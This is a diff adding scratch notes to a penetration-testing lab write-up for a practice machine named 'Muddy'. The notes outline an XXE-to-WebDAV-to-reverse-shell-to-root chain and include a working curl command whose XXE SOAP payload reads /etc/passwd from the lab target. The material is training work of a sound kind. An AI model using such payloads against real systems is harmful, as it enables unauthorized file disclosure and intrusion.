@@ -1,4 +1,4 @@
-
+unofficial scratch pad
 # Muddy
 
 In this lab, we'll exploit an XXE (XML External Entity Expansion) vulnerability to access credentials for a WebDAV service. By using WebDAV, we'll upload a reverse shell to establish a foothold on the target. Finally, we'll leverage a cron job PATH to elevate our access to root.
@@ -43,3 +43,34 @@ http://muddy.ugc:8888/muddy/
 
 
 https://medium.com/@ardian.danny/oscp-practice-series-11-proving-grounds-muddy-6aac7695000b
+
+gobuster apparently yields WebDAV, lets give it a go.
+
+we need LFI first.
+
+```zsh
+
+curl -s -X $'POST' \
+-H $'Content-Type: text/xml;charset=UTF-8' \
+-H $'SOAPAction: \"http://muddy.ugc:8888/muddy/soap11/checkout\"' \
+--data-binary $'<?xml version="1.0"?>
+<!DOCTYPE uid
+[<!ENTITY stolen SYSTEM "file:///etc/passwd">
+]>
+<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
+xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"
+xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"
+xmlns:urn=\"urn:HelloService\"><soapenv:Header/>
+<soapenv:Body>
+<urn:checkout soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">
+<uid xsi:type=\"xsd:string\">&stolen;</uid>
+</urn:checkout>
+</soapenv:Body>
+</soapenv:Envelope>' \
+'http://muddy.ugc:8888/muddy/soap11/checkout' | xmllint --format -
+
+
+```
+
+it works!!
+
